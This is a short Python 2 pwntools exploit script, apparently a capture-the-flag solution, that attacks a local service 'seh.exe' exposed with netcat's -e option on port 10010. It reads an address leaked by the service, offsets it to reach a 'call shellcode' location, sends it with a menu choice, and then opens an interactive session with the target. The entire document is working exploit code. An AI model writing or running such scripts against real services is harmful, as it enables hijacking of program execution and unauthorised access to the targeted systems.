#!/usr/bin/env python2
from pwn import *

# nc -l -p 10010 -e ./seh.exe
c = remote("localhost", 10010)

c.recvline() # drop first hint
result = c.recvline().split(':')
addr = int(result[1].replace("\r\n",""), 16) + 3 # call shellcode

ans = '6' + '\n'
ans += str(addr)

c.sendline(ans)

c.interactive()
c.close()
